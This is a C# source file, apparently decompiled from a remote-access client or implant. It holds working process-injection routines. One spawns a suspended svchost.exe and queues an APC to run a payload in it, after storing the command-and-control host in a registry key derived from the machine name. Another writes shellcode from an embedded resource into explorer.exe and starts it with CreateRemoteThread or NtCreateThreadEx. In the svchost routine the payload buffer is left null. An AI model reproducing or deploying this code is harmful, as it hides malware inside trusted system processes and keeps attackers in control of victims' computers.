using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using Models;
using algorithm;
using client.Properties;

namespace newClient.Utilities;

public class Inject
{
	public static void Injectsvchost()
	{
		Process currentProcess = Process.GetCurrentProcess();
		Logger.Info($"{Environment.UserName}    {currentProcess.Id}   {currentProcess.ProcessName} CommandLine :{Environment.CommandLine}");
		if (!Environment.UserName.Equals("system", StringComparison.OrdinalIgnoreCase) || currentProcess.SessionId != 0 || !currentProcess.ProcessName.Contains("svchost") || Environment.CommandLine.EndsWith("gotcp") || Environment.CommandLine.EndsWith("goudp"))
		{
			return;
		}
		Logger.Info("Injectsvchost true");
		string hash = Hash.GetHash(Environment.MachineName, "@");
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + hash))
		{
			registryKey.SetValue(hash + "ht", GZip.Compress(Encoding.UTF8.GetBytes(config.host)));
		}
		byte[] array = null;
		string text = Environment.GetEnvironmentVariable("systemdrive") + "\\Windows\\System32\\svchost.exe";
		if (!File.Exists(text))
		{
			return;
		}
		PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
		STARTUPINFOEX lpStartupInfo = default(STARTUPINFOEX);
		lpStartupInfo.StartupInfo = default(STARTUPINFO);
		Logger.Info("CreateProcess");
		string lpCommandLine = ((config.PProType == ProType.TCP) ? "gotcp" : "goudp");
		if (NativeInvoke.CreateProcess(text, lpCommandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 4u, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation))
		{
			Logger.Info(text);
			IntPtr intPtr = NativeInvoke.VirtualAllocEx(lpProcessInformation.hProcess, IntPtr.Zero, array.Length, 4096, 64);
			int lpNumberOfBytesWritten = 0;
			if (NativeInvoke.WriteProcessMemory(lpProcessInformation.hProcess, intPtr, array, array.Length, ref lpNumberOfBytesWritten))
			{
				NativeInvoke.QueueUserAPC(intPtr, lpProcessInformation.hThread, IntPtr.Zero);
				NativeInvoke.ResumeThread(lpProcessInformation.hThread);
				Thread.Sleep(-1);
			}
		}
	}

	public static void Injectwinlogon()
	{
		int id = Process.GetProcessesByName("explorer")[0].Id;
		gogo(Resources.session, "explorer", id);
	}

	private static void gogo(byte[] shellcodebyts, string app, int processId)
	{
		try
		{
			Logger.Info(app + "  inject");
			Logger.Info($"Id : {processId}");
			IntPtr intPtr = NativeInvoke.OpenProcess(ProcessAccessFlags.All, bInheritHandle: false, processId);
			Logger.Info($"Open {intPtr}");
			IntPtr intPtr2 = NativeInvoke.VirtualAllocEx(intPtr, IntPtr.Zero, shellcodebyts.Length, 4096, 64);
			Logger.Info($"Alloc {intPtr}");
			int lpNumberOfBytesWritten = 0;
			if (NativeInvoke.WriteProcessMemory(intPtr, intPtr2, shellcodebyts, shellcodebyts.Length, ref lpNumberOfBytesWritten))
			{
				Logger.Info("Write");
				if (!clienthelper.OperatingSystem.Contains("7"))
				{
					Logger.Info(NativeInvoke.CreateRemoteThread(intPtr, IntPtr.Zero, 0u, intPtr2, (IntPtr)shellcodebyts.Length, 0u, IntPtr.Zero).ToString() ?? "");
				}
				else
				{
					IntPtr threadHandle;
					int num = NativeInvoke.NtCreateThreadEx(out threadHandle, 2032639, IntPtr.Zero, intPtr, intPtr2, IntPtr.Zero, createSuspended: false, 0u, 0u, 0u, IntPtr.Zero);
					Logger.Info(threadHandle.ToString() ?? "");
				}
				Thread.Sleep(30000);
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message);
		}
	}
}
